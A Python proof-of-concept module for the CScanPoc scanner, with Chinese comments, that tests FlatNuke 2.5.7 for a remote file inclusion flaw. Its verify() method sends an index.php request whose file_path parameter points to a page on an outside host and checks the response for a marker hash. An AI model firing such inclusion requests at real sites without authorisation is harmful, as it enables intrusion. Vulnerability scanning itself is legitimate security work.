# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'FlatNuke_0000'  # 平台漏洞编号
    name = 'FlatNuke 2.5.7 Index.php Remote File Include Vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        FlatNuke 2.5.7 Index.php RFI 远程文件包含。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FlatNuke'  # 漏洞组件名称
    product_version = '2.5.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1f2f9988-7ac3-40e9-bd05-5031a41a3841'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/index.php?file_path=http://www.sqlsec.com/admin.html'
            response = requests.get(vul_url).text

            if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
